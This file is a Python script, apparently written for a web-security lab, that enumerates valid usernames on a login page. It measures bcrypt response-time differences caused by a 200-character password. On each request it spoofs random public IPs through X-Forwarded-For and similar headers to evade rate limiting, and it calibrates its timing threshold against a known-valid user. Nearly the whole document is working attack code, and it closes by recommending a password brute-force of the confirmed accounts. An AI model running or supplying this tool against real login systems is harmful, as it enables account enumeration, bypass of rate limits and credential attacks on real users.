import random
import time
import requests

URL = "https://YOUR-LINK/login"
WORDLIST = "authentication/wordlist/usernames.txt"
PASSWORD = "A" * 200      # Long password to exaggerate bcrypt timing
MAX_RETRIES = 3           # Retries on connection error before skipping
RETRY_DELAY = 2           # Seconds to wait between retries
VERIFY_ROUNDS = 3         # How many times to re-test flagged candidates
CALIBRATION_ROUNDS = 5    # How many times to probe the known-valid username
CALIBRATION_MARGIN = 0.5  # Fraction of the known-valid-to-baseline gap used as threshold
# e.g. 0.5 means threshold sits 50% of the way between
# baseline avg and known-valid avg — avoids setting it too tight
# or too loose. Lower = more sensitive, higher = stricter.
BASELINE_USERNAME = "definitely_not_real_xyz_abc_000"

# A known-valid username on the target — used only for threshold calibration, not enumeration
# TODO: update this to a confirmed valid username on the target
CALIBRATION_USERNAME = "wiener"

# LOAD WORDLIST
with open(WORDLIST) as wordlist_file:
    usernames = wordlist_file.read().splitlines()

print(f"[*] Total Usernames to Test : {len(usernames)}")
print(f"[*] Calibration Rounds      : {CALIBRATION_ROUNDS}")
print(f"[*] Calibration Margin      : {CALIBRATION_MARGIN}")
print(f"[*] Verification Rounds     : {VERIFY_ROUNDS}")
print()

# REALISTIC IP GENERATOR
# Mimics real ISP/residential IP patterns:
#   - Octet 2 stays in ISP-like ranges (not .0 or .255 blocks)
#   - Octet 4 avoids .0 (network addr) and .255 (broadcast)
#   - Skips all RFC-1918 / loopback / reserved ranges:
#       10.x.x.x
#       172.16-31.x.x
#       192.168.x.x
#       127.x.x.x
#       0.x.x.x / 255.x.x.x
#       169.254.x.x  (link-local)
#       100.64-127.x.x  (CGN / shared address space)
# No seed — genuinely random each run so IPs aren't reused
# across script executions.
def generate_realistic_ip() -> str:
    while True:
        octet_1 = random.randint(1, 223)  # Stay out of multicast (224+)
        octet_2 = random.randint(1, 254)  # Avoid .0 subnet blocks
        octet_3 = random.randint(1, 254)
        octet_4 = random.randint(2, 253)  # Avoid network (.0) and broadcast (.255)
        # RFC-1918 private ranges
        if octet_1 == 10:
            continue
        if octet_1 == 172 and 16 <= octet_2 <= 31:
            continue
        if octet_1 == 192 and octet_2 == 168:
            continue

        # Loopback
        if octet_1 == 127:
            continue
        # Link-local (APIPA)
        if octet_1 == 169 and octet_2 == 254:
            continue
        # Shared address space / CGN (RFC 6598)
        if octet_1 == 100 and 64 <= octet_2 <= 127:
            continue

        return f"{octet_1}.{octet_2}.{octet_3}.{octet_4}"

# SINGLE REQUEST : returns elapsed time and status code
# Spoofs a fresh IP on every call (new IP per retry too)
def send_request(username: str) -> dict | None:
    spoofed_ip = generate_realistic_ip()
    # X-Forwarded-For is the de-facto standard and should work on most targets.
    # The additional headers are fallbacks for targets that trust a different header
    # depending on their reverse proxy or server stack:
    #   X-Real-IP    : commonly used by Nginx
    #   X-Remote-IP  : used by some custom proxy configurations
    #   X-Client-IP  : used by some load balancers and CDN setups
    # Safe to leave all four in, they don't interfere with each other.
    headers = {
        "X-Forwarded-For" : spoofed_ip,
        "X-Real-IP"       : spoofed_ip,
        "X-Remote-IP"     : spoofed_ip,
        "X-Client-IP"     : spoofed_ip,
    }

    # TODO: update field names if the target login form uses different parameter names
    # e.g. "user" / "pass", "email" / "passwd", etc.
    data = {
        "username": username,
        "password": PASSWORD,
    }

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            start = time.time()
            response = requests.post(URL, data=data, headers=headers)
            elapsed  = time.time() - start

            return {
                "username"           : username,
                "spoofed_ip"         : spoofed_ip,
                "status_code"        : response.status_code,
                "response_received"  : round(response.elapsed.total_seconds(), 4),
                "response_completed" : round(elapsed, 4),
            }

        except requests.exceptions.ConnectionError:
            print(f"[!] Connection error for '{username}' (attempt {attempt}/{MAX_RETRIES}) — retrying in {RETRY_DELAY}s")
            time.sleep(RETRY_DELAY)
            spoofed_ip = generate_realistic_ip()  # Fresh IP on retry too

    print(f"[!] Max retries reached for '{username}' — skipping")
    return None

# BASELINE — guaranteed invalid username
# Establishes the server's normal (no-bcrypt) response time.
# Run first so calibration has a reference point to compare against.
# TODO: update this to a username format that is guaranteed not to exist on the target
print("[*] Running baseline (guaranteed invalid username)...")

baseline_result = send_request(BASELINE_USERNAME)

if baseline_result is None:
    print("[!] Baseline request failed — check URL and connectivity.")
    exit(1)

baseline_time = baseline_result["response_received"]

print(f"[*] Baseline Status : {baseline_result['status_code']}")
print(f"[*] Baseline Time   : {baseline_time:.4f}s")
print()

# CALIBRATION — probe the known-valid username
# Runs CALIBRATION_ROUNDS requests against the known-valid username to measure
# the real bcrypt response time on this specific target.
#
# Threshold is then calculated as:
#   threshold = baseline + (margin * (known_valid_avg - baseline))
#
# With CALIBRATION_MARGIN = 0.5, the threshold sits 50% of
# the way between baseline and known_valid_avg. This means:
#   - A username needs to be meaningfully slow to be flagged
#   - But the bar isn't set so high that the known-valid username itself would fail
#
# Example:
#   baseline          = 0.3s
#   known_valid_avg   = 2.8s
#   gap               = 2.5s
#   threshold         = 0.3 + (0.5 * 2.5) = 1.55s
print("=" * 70)
print("CALIBRATION — probing known-valid username to set threshold")
print("=" * 70)
print()

calibration_times = []

for calibration_round in range(1, CALIBRATION_ROUNDS + 1):
    calibration_result = send_request(CALIBRATION_USERNAME)

    if calibration_result is None:
        print(f"  [!] Calibration round {calibration_round} failed — skipping")
        continue

    round_time = calibration_result["response_received"]
    calibration_times.append(round_time)

    print(
        f"Round {calibration_round}/{CALIBRATION_ROUNDS}: "
        f"IP: {calibration_result['spoofed_ip']:<15} | "
        f"Status: {calibration_result['status_code']} | "
        f"Response Received: {round_time:.4f}s"
    )

if not calibration_times:
    print("[!] All calibration rounds failed — cannot set threshold. Exiting.")
    exit(1)

calibration_avg = sum(calibration_times) / len(calibration_times)
calibration_gap = calibration_avg - baseline_time
flag_threshold  = baseline_time + (CALIBRATION_MARGIN * calibration_gap)

print()
print(f"[*] Known-Valid Avg Response : {calibration_avg:.4f}s")
print(f"[*] Baseline Time            : {baseline_time:.4f}s")
print(f"[*] Gap (known-valid - base) : {calibration_gap:.4f}s")
print(f"[*] Flag Threshold           : {flag_threshold:.4f}s  (baseline + {CALIBRATION_MARGIN} * gap)")
print()

if calibration_gap < 0.5:
    print("[!] WARNING: Gap between baseline and known-valid is very small (<0.5s).")
    print("    The target may be under load or not using a slow hashing algorithm.")
    print("    Consider re-running calibration or adjusting CALIBRATION_MARGIN.")
    print()

# PHASE 1 — ENUMERATE USERNAMES
# Flag any username whose response_received exceeds the
# dynamically calculated threshold.
print("=" * 70)
print("PHASE 1 — USERNAME ENUMERATION")
print("=" * 70)
print()

candidates  = []   # Usernames that beat the threshold

for index, username in enumerate(usernames):
    result = send_request(username)

    if result is None:
        continue

    is_flagged  = result["response_received"] >= flag_threshold
    flag_marker = "  <-- CANDIDATE" if is_flagged else ""

    print(
        f"[{index:>4}] "
        f"{result['username']:<20} | "
        f"IP: {result['spoofed_ip']:<15} | "
        f"Status: {result['status_code']} | "
        f"Response Received: {result['response_received']:.4f}s | "
        f"Response Completed: {result['response_completed']:.4f}s"
        f"{flag_marker}"
    )
    if is_flagged:
        candidates.append(username)

print()

# PHASE 2 — VERIFY CANDIDATES
# Re-test each flagged username VERIFY_ROUNDS times.
# A username is confirmed if it beats the threshold in the
# majority of verification rounds (> 50%).
# This filters out one-off jitter false positives.
print("=" * 70)
print(f"PHASE 2 — VERIFYING {len(candidates)} CANDIDATE(S)")
print("=" * 70)
print()

confirmed = []

for username in candidates:
    verification_hits  = 0
    verification_times = []

    print(f"[*] Verifying: {username}")

    for round_num in range(1, VERIFY_ROUNDS + 1):
        result = send_request(username)

        if result is None:
            print(f"  Round {round_num}: FAILED (connection error)")
            continue

        round_time = result["response_received"]
        verification_times.append(round_time)
        passed = round_time >= flag_threshold

        if passed:
            verification_hits += 1

        print(
            f"  Round {round_num}/{VERIFY_ROUNDS}: "
            f"IP: {result['spoofed_ip']:<15} | "
            f"Response Received: {round_time:.4f}s | "
            f"{'PASS' if passed else 'FAIL'}"
        )

    if verification_times:
        avg_verification_time = sum(verification_times) / len(verification_times)
        print(f"  Average: {avg_verification_time:.4f}s | Hits: {verification_hits}/{len(verification_times)}")

        if verification_hits > len(verification_times) / 2:
            print(f"[+] CONFIRMED: {username}\n")
            confirmed.append({
                "username" : username,
                "avg_time" : avg_verification_time,
                "hits"     : verification_hits,
            })
        else:
            print("[-] Rejected (inconsistent timing — likely jitter)\n")
    else:
        print(f"[-] No results for {username}\n")

# FINAL SUMMARY
print("=" * 70)
print("FINAL RESULT")
print("=" * 70)
print()
print(f"[*] Baseline Time         : {baseline_time:.4f}s")
print(f"[*] Known-Valid Avg Time  : {calibration_avg:.4f}s")
print(f"[*] Flag Threshold        : {flag_threshold:.4f}s")
print(f"[*] Candidates Flagged    : {len(candidates)}")
print(f"[*] Confirmed Usernames   : {len(confirmed)}")
print()

if confirmed:
    for entry in confirmed:
        print(f"[+] Username : {entry['username']}")
        print(f"    Avg Time : {entry['avg_time']:.4f}s")
        print(f"    Rounds   : {entry['hits']}/{VERIFY_ROUNDS} above threshold")
        print()
    print("[>] Next step: brute-force the password for confirmed username(s).")
else:
    print("[!] No usernames confirmed.")
    print("    Suggestions:")
    print("     - Lower CALIBRATION_MARGIN (try 0.3) to widen the net")
    print("     - Check PASSWORD length is still 'A' * 200")
    print("     - Re-run — the target server load may have been unusually high")